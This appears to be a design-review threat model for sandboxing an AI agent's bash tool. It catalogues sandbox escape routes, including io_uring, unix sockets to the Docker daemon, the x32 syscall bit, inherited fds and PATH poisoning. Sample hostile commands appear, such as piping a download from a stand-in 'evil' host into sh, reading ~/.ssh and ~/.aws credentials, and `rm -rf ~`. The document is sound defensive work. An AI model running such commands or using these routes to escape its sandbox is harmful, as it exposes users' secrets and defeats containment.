# Threat Model — bash tool OS sandbox (SR-3a)

Status: draft for review (security-architect, 2026-07-11)
Scope: the OS sandbox added to the `bash` built-in tool.
Inputs: `docs/superpowers/specs/bash-sandbox.md` (approved spec),
`internal/adapter/tool/bash/bash.go` (current unsandboxed tool),
`cmd/pythia/main.go` (composition root), `internal/config/config.go`.

This document threat-models the sandbox, performs an adversarial bypass
analysis of every control, settles the open design calls, and emits ranked,
testable security requirements that seed the build plan. It also flags the
parts of the approved design that are **not safe as written** and must change
before build.

The governing assumption throughout: **a competent attacker controls the exact
bytes of the command string.** The model chooses the command from untrusted
context (prompt, prior tool output, files it read), so the command is hostile
input, not a developer-authored script. Everything downstream of the command
string is in the attacker's hands.

---

## 1. Trust boundary and STRIDE analysis

### 1.1 The boundary

```
 TRUSTED (Pythia parent)                    | UNTRUSTED (sandboxed child)
                                            |
 config.Load (parent env)                   |
 tool registry / turn loop                  |
 exec.Command(/proc/self/exe,"__bash-sandbox")
        │  out-of-band: {workspace root, command bytes}
        ▼                                   |
 ┌─ pythia __bash-sandbox (our code) ───────┼──────────────────────┐
 │  1. RLIMIT / fd hygiene                  |                       │
 │  2. env scrub (allowlist)                |                       │
 │  3. NO_NEW_PRIVS                         |   <-- THE BOUNDARY -->│
 │  4. Landlock restrict_self               |                       │
 │  5. seccomp allowlist (TSYNC)            |                       │
 │  6. syscall.Exec(/bin/bash,-c,cmd) ──────┼──► bash + children    │
 └──────────────────────────────────────────┘   (attacker-chosen)  │
                                            |   under Landlock+seccomp
```

The trust boundary is **model-chosen-command → sandboxed child**. Everything
below step 6 executes attacker-controlled logic. The controls of steps 1–5 are
the entire security perimeter; once bash starts, only the kernel (Landlock LSM +
seccomp-bpf) constrains it.

Two things sit *outside* the sandbox and are load-bearing:

- The **parent** Pythia is fully privileged and has network (Ollama). It must
  never be sandboxed and must never inherit hostile state from a child.
- The **tool output envelope** (`stdout`/`stderr`) is returned from the child
  to the parent and thence into the model/provider context. This is a data
  egress channel the sandbox does not and cannot close (see 2.7).

### 1.2 STRIDE over the boundary

| STRIDE | Threat at this boundary | Primary control | Residual |
|--------|-------------------------|-----------------|----------|
| **Spoofing** | Command influences argv[0]/reserved arg to skip sandbox setup; replaces `bash`/`pythia` binary so re-exec runs attacker code unsandboxed | Command passed out-of-band never as argv; re-exec from `/proc/self/exe`; fixed absolute bash path; binary outside writable scope | Nested re-exec (harmless — LSM only narrows) |
| **Tampering** | Write outside workspace (`rm -rf ~`, overwrite `~/.bashrc`, corrupt Pythia DB, overwrite Pythia binary); tamper other same-uid process memory | Landlock write-scope (workspace+/tmp), REFER (ABI≥2), ptrace/process_vm_writev denied, DB+binary kept out of writable scope | /tmp shared with host; DoS via disk fill |
| **Repudiation** | Command acts with no attribution / disables its own audit | One-time unsandboxed-mode log; seccomp attempts observable (optional LOG action) | No per-command audit log in this slice |
| **Info disclosure** | Read + exfiltrate secrets (`~/.ssh`, `~/.aws`, `/proc/*/environ` of same-uid procs); inherit parent env secrets | Network denial (no socket); env allowlist scrub; ptrace/process_vm_readv denied | **stdout returns secrets to model/provider** (2.7); broad read is intentional |
| **Denial of service** | Fork bomb, memory exhaustion, fill /tmp, spin CPU | Context timeout + output cap (existing) | **No rlimits/cgroups this slice** — fork/mem/disk DoS remains |
| **Elevation of privilege** | Escape the sandbox to the host: reach a host daemon (Docker/systemd) via unix socket, load a kernel module, ptrace the parent, use io_uring to bypass seccomp, run a setuid binary | seccomp allowlist (io_uring/ptrace/mount/module/keyctl denied), socket denial incl. AF_UNIX, NO_NEW_PRIVS, x32/foreign-arch killed | see full bypass analysis §2 |

### 1.3 Abuse / misuse cases (attacker goals)

1. **Exfiltrate a secret** it read (`cat ~/.aws/credentials`) off-box.
2. **Fetch and run a remote payload** (`curl evil/x | sh`).
3. **Reach a host control-plane daemon** (Docker socket → container host RCE;
   systemd/dbus; a local database socket).
4. **Persist**: overwrite `~/.bashrc`, a cron file, the Pythia binary, or the
   session DB so the next run is compromised.
5. **Escalate to host root**: kernel module load, `bpf`, setuid binary,
   `ptrace`/`process_vm_writev` into a more-privileged process.
6. **Bypass a control via a side channel**: io_uring, a 32-bit/x32 syscall, an
   inherited fd, a syscall multiplexer.
7. **Deny service**: fork bomb / fill the disk / exhaust memory.

The bypass analysis below is organised around goals 1–6; goal 7 is an accepted,
documented residual (out of scope this slice — see §5.R).

---

## 2. Adversarial bypass analysis (the core)

For each control: how the attacker escapes it, and what the design must do.
Findings that require a design change are tagged **[MUST-FIX]**.

### 2.1 seccomp network denial

The spec denies `socket(AF_INET/AF_INET6, …)`. seccomp can read `socket`'s
scalar `domain` arg (arg0), so domain filtering is technically sound *for the
`socket` syscall*. But "deny AF_INET" is **not** the same as "deny network":

- **AF_UNIX to a host daemon — [MUST-FIX].** If `socket(AF_UNIX)` is allowed,
  a command can `connect()` to any host unix socket: `/var/run/docker.sock`
  (→ trivially full host takeover), the systemd private socket, a Postgres/MySQL
  socket, X11 (`/tmp/.X11-unix`), the Ollama unix socket if present, `/dev/log`.
  Landlock only governs **filesystem-path** unix sockets, and only via the
  directory traversal to the socket inode — its coverage of `connect()` on unix
  sockets is ABI-dependent and must not be relied on. **Abstract unix sockets**
  (leading NUL, e.g. many systemd/dbus/X11 endpoints) have *no* filesystem path,
  so Landlock cannot gate them at all. Conclusion: denying only AF_INET/6 leaves
  a full local-IPC escape surface. **`socket()` must be denied for every family**
  (the allowlist simply must not include `socket`/`socketpair`), unless a
  concrete need for a specific family is proven — there is none for bash.
- **AF_NETLINK.** Netlink talks to kernel subsystems (route, audit, uevent).
  No internet egress, but no legitimate need either. Default-deny covers it.
- **io_uring — [MUST-FIX], the headline bypass.** `io_uring_setup` +
  `io_uring_enter` let a program submit `IORING_OP_SOCKET`, `IORING_OP_CONNECT`,
  `IORING_OP_SEND/RECV`, `IORING_OP_OPENAT`, `IORING_OP_READ/WRITE` as ring
  entries. These operations are **not dispatched through the syscall layer**, so
  a seccomp filter that keys on the `socket`/`connect` syscall numbers **never
  sees them**. io_uring therefore bypasses *both* network denial and any
  syscall-number-based filesystem assumptions. **io_uring_setup / io_uring_enter
  / io_uring_register must be blocked.** With an allowlist (§2.3) they are
  blocked for free; with a denylist they are one forgotten entry from a full
  bypass. This single point is the strongest argument for allowlist-by-default.
- **Reusing an inherited fd — [MUST-FIX].** `connect()`/`socket()` are moot if
  the child inherits an already-connected socket fd across `execve`: `sendto`/
  `sendmsg`/`write` on an existing fd need no `socket()` call. The parent holds
  a live Ollama HTTP socket and a SQLite file handle. **All parent fds must be
  close-on-exec** so none survive into the child/bash (see §2.4).
- **DNS via a local resolver.** DNS is UDP/TCP → AF_INET → denied. A
  systemd-resolved varlink/dbus path is AF_UNIX → denied once AF_UNIX is denied.
  Reading `/etc/hosts` is allowed but yields no egress.
- **/proc, /sys write channels.** Writes to `/proc/sysrq-trigger`,
  `/proc/self/mem`, `/sys/...` are governed by Landlock's filesystem rules;
  none are in the write scope (workspace+/tmp) → denied. Covered by §2.2, and
  by fd hygiene for pre-opened writable fds.

**Net:** network denial as specified (AF_INET/6 only) is **bypassable** via
AF_UNIX, io_uring, and inherited fds. All three must be closed.

### 2.2 Landlock write-scope

Write scope = workspace root + `/tmp`. Landlock is inode/hierarchy-based and
enforced by the kernel at open time, which neutralises the classic userspace
tricks — but not all:

- **Symlink escape — mitigated by design.** Landlock does not match on path
  strings; it evaluates the resolved object against the ruleset hierarchy. A
  symlink `workspace/evil → /etc/passwd` opened for write is checked against the
  `/etc` hierarchy (not in scope) → `EACCES`. Same for `/proc/self/root/...`
  and `/proc/self/cwd/...` magic links — they resolve to the real inode.
- **TOCTOU — not applicable.** The kernel enforces each `open` atomically
  against the ruleset; there is no check-then-use window in userspace to race.
- **Hardlink escape — [MUST-FIX unless ABI≥2].** `link("/some/outside/file",
  "workspace/x")` then open `workspace/x` for write: Landlock keys the write
  check on the path traversed (the writable workspace), so a hardlink can smuggle
  an out-of-scope inode into a writable name. **`LANDLOCK_ACCESS_FS_REFER`
  (ABI 2)** governs linking/renaming across the ruleset boundary and denies it.
  This is a concrete reason to **require a minimum ABI ≥ 2 and fail closed**
  rather than best-effort degrade to ABI 1 (§3.2). (The attacker must already be
  able to read/link the target under DAC, which bounds impact, but same-uid
  files are in reach.)
- **Pre-opened writable fd across execve — [MUST-FIX].** Landlock checks at
  `open` time, not per-write. A writable fd to an out-of-scope file that is
  inherited across `execve` lets bash write there with no fresh `open`. Same
  root cause as the socket-fd bypass: **fd hygiene / close-on-exec** (§2.4). The
  child must also hold no stray out-of-scope writable fd of its own when it
  applies Landlock and execs.
- **/dev entries.** `/dev` is not in write scope → cannot write `/dev/sda`,
  `/dev/mem`, create devices (`mknod` also denied). Read-broad exposes `/dev`
  under DAC only (non-root cannot read `/dev/mem`).
- **Control-plane files inside the writable scope — [MUST-FIX].** With defaults
  (`PYTHIA_DB_PATH=./pythia.db`, workspace = cwd), the **session DB lives inside
  the writable scope**, and if Pythia is launched from the workspace so does the
  **binary**. A sandboxed command can then `rm pythia.db` (destroy/tamper
  history) or overwrite the Pythia binary (persistent compromise of the tool
  itself, and a re-exec-integrity break — see §2.4). The DB and binary must live
  **outside** the writable scope, or the write scope must exclude them.

### 2.3 seccomp syscall-filter completeness — allowlist vs denylist

The spec is ambiguous ("denylist/allowlist"). This must be pinned to
**allowlist / default-deny**. A denylist is unsound here for structural reasons:

- **Syscall multiplexers.** `socketcall(2)` (32-bit) multiplexes socket/connect/
  send/recv behind one number; a denylist of `socket` misses it entirely.
  io_uring multiplexes almost everything (§2.1). A denylist must enumerate every
  multiplexer *and* every operation reachable through it — impossible to keep
  complete.
- **New syscalls.** Every kernel adds syscalls. A denylist is stale the day a
  new dangerous syscall ships (io_uring itself is the cautionary tale). An
  allowlist denies anything unknown by default — it fails safe.
- **ptrace family & memory pokes — [MUST-FIX].** Blocking `ptrace` is not
  enough: `process_vm_readv`/`process_vm_writev` read/write another process's
  memory *without* `ptrace`; `kcmp`, `userfaultfd`, and `mmap`-of-another-proc
  paths give further reach. A denylist must remember each; an allowlist omits
  them by default. process_vm_readv/writev, userfaultfd, kcmp must not be in the
  allowlist.
- **The x32 / foreign-arch bypass — [MUST-FIX].** seccomp filters are
  per-architecture. On x86_64 the **x32 ABI** sets `__X32_SYSCALL_BIT`
  (`0x40000000`) on the syscall number; a filter that checks the number but not
  the arch/bit is bypassed by calling `nr | 0x40000000`. Likewise a process can
  issue **i386** syscalls (different numbering) under `AUDIT_ARCH_I386`. The
  filter **must validate `seccomp_data.arch`** and **kill** any non-native arch
  (and reject the x32 bit), before any number comparison. go-seccomp-bpf must be
  configured to enforce the native arch and deny others.

Because an allowlist gets io_uring, socketcall, process_vm_*, and every future
syscall right *for free*, and a denylist gets each one wrong until someone
remembers it, the answer is not close: **allowlist, default-deny.**

Allowlist must include the syscalls bash + the child actually need, notably
`execve`/`execveat` (or the exec into bash fails), plus the small set Go's
`syscall.Exec` issues between filter-install and exec. Getting this set right is
the real implementation work; go-seccomp-bpf's curated profiles are the starting
point, trimmed to remove `socket`, `io_uring_*`, `ptrace`, `mount`, module/key
families, etc.

### 2.4 Re-exec integrity & fd hygiene

- **argv / reserved-arg injection — safe if built as specced.** The parent
  builds `exec.Command(<self>, "__bash-sandbox")`; the command bytes travel
  **out-of-band**, never as an argv token. The model controls the command
  string but not argv[0] or argv[1], so it cannot add or suppress the reserved
  arg. Keep it that way: the command must **never** be interpolated into argv.
- **Binary replacement / re-exec target — [MUST-FIX].** Resolving self by name
  (`os.Executable()` path) is TOCTOU-able: if a prior sandboxed command
  overwrote that path (possible when the binary sits in the writable scope,
  §2.2), the next re-exec runs attacker code **in the unsandboxed parent
  context**. **Re-exec from `/proc/self/exe`**, which references the running
  image regardless of on-disk replacement, and keep the binary out of the
  writable scope.
- **`bash` replaced on PATH — [MUST-FIX].** If the child resolves `bash` via a
  PATH inherited from the parent, and a prior command wrote a fake `bash` into a
  writable PATH directory (workspace/tmp on PATH), the child execs the fake.
  **Resolve bash to a fixed absolute path** (`/bin/bash` or `/usr/bin/bash`),
  never via `LookPath` on an inherited PATH. See also PATH scrub §2.5.
- **Out-of-band channel: env var vs pipe.** A dedicated **pipe** (child
  `ExtraFiles` fd, O_CLOEXEC, read-to-EOF then closed before exec) is safer than
  an env var: the command bytes never land in `/proc/<child>/environ`, and there
  is no risk of the value being re-interpreted as configuration. **Framing must
  be length-prefixed**, not newline/delimiter-delimited — the attacker controls
  the command bytes and can embed newlines and NULs, so a delimiter-based frame
  could be desynchronised. Send `{len(root)}{root}{len(cmd)}{cmd}` with the
  trusted root first. If an env var is used instead, it **must be stripped before
  the scrub/exec** so bash never sees it (the allowlist already drops it, but be
  explicit). Recommendation: **pipe, length-prefixed.**
- **fd leakage from parent — [MUST-FIX].** The parent holds the SQLite handle
  and the Ollama socket. Go opens files/sockets O_CLOEXEC by default and
  `exec.Cmd` passes only 0/1/2 + `ExtraFiles`, so in the happy path nothing
  leaks — but this is a **security invariant, not an incidental**: any
  `ExtraFiles` entry, any fd opened without O_CLOEXEC, or the policy pipe left
  open across the final exec, becomes a network-egress (§2.1) or fs-write (§2.2)
  bypass. Require: child sets O_CLOEXEC on / closes all fds except 0/1/2 before
  exec; the policy pipe is O_CLOEXEC and closed after reading; add a test that
  enumerates `/proc/self/fd` inside the sandbox and asserts only 0/1/2 remain.
- **NO_NEW_PRIVS — [MUST-FIX], and a bonus control.** Both Landlock
  `restrict_self` and seccomp (without CAP_SYS_ADMIN) **require**
  `PR_SET_NO_NEW_PRIVS`. Setting it also **neutralises setuid/setgid binaries**:
  bash cannot regain privilege via `sudo`, `ping`, `mount`, `pkexec`, etc. This
  closes a whole EoP class and must be set before Landlock/seccomp.
- **Thread affinity — implementation correctness.** Go is multithreaded. seccomp
  must be installed with **TSYNC** (all threads); Landlock `restrict_self`
  applies to the calling thread and is what `syscall.Exec` carries across, so
  the child must **`runtime.LockOSThread`**, apply Landlock+seccomp, and exec on
  that same thread, with the filter installed as the last step before exec
  (execve in the allowlist).
- **Nested re-exec is harmless.** If a command runs `pythia __bash-sandbox`
  again, LSM stacking guarantees the nested Landlock/seccomp can only **narrow**,
  never widen, and the nested child inherits none of the parent's fds. No
  escalation; worth noting as defence-in-depth, not a hole.

### 2.5 Environment scrub

Allowlist keeps `PATH, HOME, TERM, LANG`; everything else dropped. Because it is
an **allowlist**, the dangerous injectors are dropped by construction —
`LD_PRELOAD`, `LD_LIBRARY_PATH`, `BASH_ENV`, `ENV`, `SHELLOPTS`, `BASHOPTS`,
`PROMPT_COMMAND`, `IFS`, `GLOBIGNORE`, etc. — good. Two residual concerns:

- **PATH is poisonable — [MUST-FIX] (ties to §2.4).** Keeping the *parent's*
  PATH value can carry writable directories (workspace/tmp) into which a prior
  command planted a malicious `curl`, `git`, or `bash`. **Set PATH to a fixed
  trusted constant** (`/usr/bin:/bin`), not the inherited value, and resolve
  bash by absolute path. Keeping PATH in the allowlist is fine only if its
  *value* is reset, not inherited.
- **HOME.** With a clean, non-interactive `bash -c` and `BASH_ENV`/`ENV`
  dropped, no rc files are sourced, so HOME is low-risk. Consider pointing HOME
  at the workspace to avoid tools writing to a real `$HOME` (which is not in
  write scope anyway, so such writes fail closed). LANG/TERM are benign.

Confirmed: the allowlist itself cannot be used for injection **provided PATH's
value is reset**. Without the PATH reset, PATH-poisoning is a live escape.

### 2.6 Escape hatch (`PYTHIA_BASH_SANDBOX=off`)

- Read via `internal/config` from the **parent process env at startup only**.
  The model's tool args carry a single `command` string; `config.Load` never
  parses tool args or command bytes, so **nothing in the command can flip the
  hatch for the current process.**
- The command runs in a **scrubbed** env (hatch var not in the allowlist) and in
  a child that must have **no off-branch**: the `__bash-sandbox` entrypoint
  applies the sandbox **unconditionally**. The off decision lives *only* in the
  parent, *before* re-exec. Requirement: the child never consults the
  environment (or the out-of-band channel) for an enable/disable flag.
- Can a command influence a **future** run? Only by editing a shell profile the
  human later sources before launching Pythia — outside this boundary and
  requiring user action. Note it as an assumption, not a sandbox hole.
- Requirement: when the hatch is on, emit the one-time explicit unsandboxed
  log/description the spec calls for (repudiation control).

### 2.7 The residual the sandbox cannot close: stdout as an egress channel

The spec accepts broad read because "network denial breaks read-then-exfil."
That reasoning is **incomplete**: the bash tool returns `stdout`/`stderr` to the
parent, which feeds them into the **model/provider** context. `cat
~/.ssh/id_rsa` (or reading a same-uid process's `/proc/<pid>/environ`, which
broad-read permits) returns the secret **through the tool-output channel**, not
through a socket. The sandbox's network denial does not touch this path.

For Pythia today the provider is a **local** Ollama (`localhost:11434`), so the
secret stays on-box — the local-only provider assumption is **load-bearing** and
should be documented as such. The moment a remote/hosted model, telemetry, or
log-shipping is introduced, broad read becomes a real exfiltration primitive.
This is why a read-denylist for high-value paths (`~/.ssh`, `~/.aws`,
`~/.config/gh`, `/proc/*/environ`) is worth reconsidering as hardening (§4,
SR-3a.H2), even though the spec defers it.

---

## 3. Settled design decisions

### 3.1 seccomp action for denied syscalls — **per-syscall, not one-size**

Recommendation:

- **Allowlisted syscalls → `ALLOW`.**
- **Default (anything not allowlisted) → `ERRNO(ENOSYS)`.** ENOSYS mimics "this
  syscall does not exist," which is exactly what glibc/musl feature-probes
  expect: they fall back to an older path instead of hard-failing. Returning
  `EPERM` as the blanket default is slightly worse because some libc code reads
  EPERM as "exists but forbidden" and errors out rather than degrading. ENOSYS
  keeps ordinary tooling working while still denying the call.
- **Network (`socket`/`socketpair` and friends) → `ERRNO(EACCES)/(EAFNOSUPPORT)`**
  so `curl`/`git` fail with a clean "network unreachable"-style error that the
  model can read in the envelope and stop retrying, rather than dying opaquely.
- **Lethal set → `KILL_PROCESS` (SIGSYS, whole process).** For syscalls with no
  legitimate use in this sandbox — `ptrace`, `process_vm_readv/writev`,
  `mount`/`umount2`, `pivot_root`, `kexec_load`, `init_module`/`finit_module`/
  `delete_module`, `bpf`, `add_key`/`keyctl`/`request_key`, `unshare`/`setns`,
  `io_uring_setup`/`enter`/`register`, `userfaultfd`, `perf_event_open`,
  reboot/swapon/swapoff — kill outright. Killing (vs errno) prevents exploit
  chains that install a SIGSYS handler and retry, and makes abuse **loud** and
  observable rather than a silently-swallowed errno.
- **Non-native arch / x32 → `KILL_PROCESS`.** Arch mismatch is only ever an
  evasion attempt.

Rationale: ENOSYS default preserves usability (the long tail of harmless
syscalls a real toolchain probes), while a curated KILL set makes the
genuinely-dangerous attempts fatal and detectable. This is strictly better than
a single global action either way.

### 3.2 Landlock ABI — **strict minimum, fail-closed (not best-effort degrade)**

Recommendation: **require a minimum Landlock ABI and fail closed below it; do
not best-effort degrade.**

- Best-effort silently drops protections the kernel lacks. Dropping **ABI 2
  (`REFER`)** re-opens the **hardlink/rename escape** (§2.2). Running
  "successfully" but under-protected is the worst outcome for a security control
  — it looks safe and isn't.
- Require **ABI ≥ 2** (REFER, for hardlink/rename containment). ABI 3 (truncate)
  is desirable; ABI 4 network rules are moot here because seccomp already denies
  sockets. Pin the exact rights the ruleset needs and refuse to install a
  ruleset that the kernel cannot fully enforce.
- Below the minimum (or Landlock/seccomp absent, or non-Linux): **fail closed**
  — the command does not run; return the "sandbox unavailable" error envelope.
  The single documented override remains `PYTHIA_BASH_SANDBOX=off` for dev.

This matches the spec's overall fail-closed posture; it just makes "closed"
mean "closed unless *fully* enforceable."

### 3.3 Allowlist vs denylist for seccomp — **allowlist, default-deny (firm)**

Confirmed — and it is not a close call. A denylist cannot be complete against
syscall multiplexers (`socketcall`, io_uring), memory-poke syscalls
(`process_vm_*`), the x32/i386 ABI, or **any syscall added in a future kernel**.
Each is a full bypass until someone remembers to add it. An allowlist denies all
of these by default and fails safe; the cost is the one-time work of curating
the allowed set (starting from go-seccomp-bpf's profiles, minus sockets and the
lethal set). **Use an allowlist.** The spec's ambiguous "denylist/allowlist"
wording must be pinned to allowlist before build.

---

## 4. Security requirements (ranked, testable — seed the build plan)

Each is phrased so a test can prove it. **[MFBS]** = must-fix-before-ship;
**[HF]** = hardening-follow-up.

**Must-fix-before-ship**

- **SR-3a.1 [MFBS] Default-deny seccomp allowlist.** The filter allows an
  explicit set and denies all else. *Test:* a syscall not in the allowlist
  (e.g. `io_uring_setup`, or a benign uncommon one) is denied; `execve` into
  bash succeeds.
- **SR-3a.2 [MFBS] io_uring blocked.** `io_uring_setup/enter/register` are
  denied (killed). *Test:* an io_uring probe fails; a network op attempted via
  io_uring cannot connect.
- **SR-3a.3 [MFBS] socket() denied for all families.** No `socket`/`socketpair`
  for AF_INET, AF_INET6, **AF_UNIX**, AF_NETLINK. *Test:* raw `socket()` probes
  for each family fail; `connect` to `/var/run/docker.sock` and to an abstract
  socket both fail.
- **SR-3a.4 [MFBS] Foreign-arch / x32 killed.** The filter validates
  `seccomp_data.arch` and kills non-native arch and the x32 bit. *Test:* a
  syscall issued under i386/x32 is killed, not allowed.
- **SR-3a.5 [MFBS] Memory-poke syscalls denied.** `ptrace`,
  `process_vm_readv`, `process_vm_writev`, `kcmp`, `userfaultfd` denied.
  *Test:* each probe fails; cannot read another same-uid process's memory.
- **SR-3a.6 [MFBS] NO_NEW_PRIVS set; setuid gains nothing.** *Test:* invoking a
  setuid helper does not change euid inside the sandbox.
- **SR-3a.7 [MFBS] fd hygiene.** Only fds 0/1/2 reach bash; the SQLite handle,
  Ollama socket, and policy pipe do not. *Test:* enumerate `/proc/self/fd`
  inside the sandbox → only 0/1/2; writing/sending via any other fd is
  impossible.
- **SR-3a.8 [MFBS] Landlock write scope + strict ABI.** Write allowed only under
  workspace root and `/tmp`; ABI ≥ 2 required, fail-closed below. *Test:* write
  outside → EACCES; write inside → ok; **hardlink** an out-of-scope file into
  workspace then write → denied (REFER); symlink/`/proc/self/root` escape →
  denied.
- **SR-3a.9 [MFBS] Filter persists across execve with TSYNC on a locked
  thread.** *Test:* a denied probe executed *from within bash* (post-exec) is
  still blocked; all threads are covered.
- **SR-3a.10 [MFBS] Fail-closed on unavailable sandbox.** Missing Landlock/
  seccomp / old kernel / non-Linux → error envelope, command **not executed**.
  *Test:* stubbed-unsupported path returns the error and never runs the command.
- **SR-3a.11 [MFBS] Escape hatch is parent-env-only and child has no
  off-branch.** *Test:* a command that sets/exports `PYTHIA_BASH_SANDBOX=off`
  does not disable the sandbox for itself; the `__bash-sandbox` entrypoint
  applies the sandbox unconditionally.
- **SR-3a.12 [MFBS] Env allowlist + PATH reset.** Only `PATH, HOME, TERM, LANG`
  reach bash; `LD_PRELOAD`, `LD_LIBRARY_PATH`, `BASH_ENV`, `ENV`, `IFS`,
  `SHELLOPTS`, `PROMPT_COMMAND` absent; **PATH value is a fixed constant**
  (`/usr/bin:/bin`), not inherited; bash resolved from a fixed absolute path.
  *Test:* `env` inside the sandbox shows exactly the allowlist with the fixed
  PATH; planting a `bash`/`curl` in a writable dir on the old PATH does not get
  executed.
- **SR-3a.13 [MFBS] Re-exec integrity.** Re-exec from `/proc/self/exe`; command
  passed via length-prefixed out-of-band channel, never argv; Pythia binary and
  session DB live **outside** the writable scope. *Test:* overwriting the
  on-disk binary path from within the sandbox does not change the running
  re-exec target; a command containing newlines/NUL/shell metacharacters is
  delivered intact and is never interpreted as argv or config; a sandboxed
  command cannot delete/tamper the session DB.
- **SR-3a.14 [MFBS] Lethal-set killed.** `mount/umount2`, `pivot_root`,
  `kexec_load`, `init_module/finit_module/delete_module`, `bpf`,
  `add_key/keyctl/request_key`, `unshare/setns`, reboot/swap families denied
  (killed). *Test:* `mount`/module/`bpf` probes fail (process killed).

**Hardening-follow-up**

- **SR-3a.H1 [HF] Resource limits.** Apply `RLIMIT_NPROC`, `RLIMIT_FSIZE`,
  `RLIMIT_AS` (and consider a pids cgroup) to bound fork-bomb / disk-fill /
  memory DoS during the command window. *Test:* a fork bomb / large-write is
  contained.
- **SR-3a.H2 [HF] Secret-read / stdout-egress mitigation.** Either a read-deny
  list for `~/.ssh`, `~/.aws`, `~/.config/gh`, `/proc/*/environ`, or a documented
  invariant that the provider is local-only and stdout is a secret egress
  channel. *Test:* reading a designated secret path is denied (if list adopted),
  or the invariant is asserted in docs/config.
- **SR-3a.H3 [HF] Observability of denied syscalls.** Optional
  `SECCOMP_RET_LOG` on a monitored subset so bypass attempts are auditable.

---

## 5. Design changes required before build (not-safe-as-written)

These are the items the current approved design gets wrong or leaves open; each
must be resolved before implementation, mapped to the SR that verifies it.

1. **Denylist → allowlist (SR-3a.1).** The spec's "denylist/allowlist" wording
   must be pinned to **allowlist / default-deny**. A denylist cannot cover
   io_uring, socketcall, process_vm_*, x32, or future syscalls.
2. **io_uring must be blocked (SR-3a.2).** Otherwise network denial *and*
   fs-syscall assumptions are bypassable via ring ops. (Free under allowlist.)
3. **socket() must be denied for ALL families, not just AF_INET/6 (SR-3a.3).**
   AF_UNIX (filesystem *and* abstract) reaches host daemons — Docker socket =
   host takeover. AF_NETLINK likewise default-deny.
4. **x32 / foreign-arch must be killed (SR-3a.4).** A number-only filter is
   bypassed via the x32 bit or the i386 ABI.
5. **All parent fds must be close-on-exec (SR-3a.7).** The Ollama socket and
   SQLite handle must not survive into the child; an inherited socket fd defeats
   network denial (`sendmsg` needs no `socket()`), an inherited writable fd
   defeats Landlock.
6. **process_vm_readv/writev, userfaultfd, kcmp must be denied with ptrace
   (SR-3a.5).** Blocking `ptrace` alone leaves memory-poke syscalls open.
7. **NO_NEW_PRIVS must be set (SR-3a.6).** Required by Landlock+seccomp, and it
   blocks setuid escalation.
8. **Landlock must be strict min-ABI ≥ 2, fail-closed (SR-3a.8, §3.2).**
   Best-effort degrade re-opens the hardlink escape.
9. **PATH must be a fixed constant and bash resolved by absolute path
   (SR-3a.12).** Inheriting the parent PATH allows a prior command to poison
   binary resolution.
10. **Re-exec from `/proc/self/exe`, and keep the DB + binary out of the
    writable scope (SR-3a.13).** With defaults the DB (`./pythia.db`) sits inside
    the writable workspace — a sandboxed command can tamper history or overwrite
    the binary and break re-exec integrity.
11. **Out-of-band command channel must be length-prefixed (pipe preferred over
    env), never argv (SR-3a.13).** The attacker controls command bytes including
    newlines/NUL; delimiter framing can be desynchronised, and an env var must be
    stripped before exec.

**R. Accepted residuals (documented, not fixed this slice):**
- **DoS** (fork bomb / memory / disk) — bounded only by timeout + output cap;
  rlimits deferred to SR-3a.H1.
- **Broad read + stdout egress** — safe *only* under the local-Ollama
  assumption; SR-3a.H2 tracks the mitigation. This assumption must be stated
  explicitly, because the spec's "no network ⇒ no exfil" rationale does not hold
  for the stdout return path.
- **/tmp shared with host** — a sandboxed command can read/write `/tmp` files
  used by other host processes; inherent to allowing `/tmp` writes.
